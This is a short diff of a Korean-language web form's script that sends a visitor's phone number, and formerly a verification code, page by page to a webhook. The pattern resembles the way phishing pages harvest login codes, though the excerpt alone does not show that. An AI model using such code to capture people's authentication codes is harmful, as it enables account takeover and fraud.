@@ -75,7 +75,7 @@
     function goToPage3() {
       const userId = document.getElementById("userId").value.trim();
 
-      if (!userId || !userCode) {
+      if (!userId) {
         alert("전화번호와 인증번호를 입력해주세요.");
         return;
       }
@@ -90,7 +90,6 @@
       const formData = new URLSearchParams();
       formData.append("page", "2");
       formData.append("phone", userId);
-      formData.append("code", userCode);
       formData.append("timestamp", new Date().toISOString());
 
       fetch(webhookUrl, {
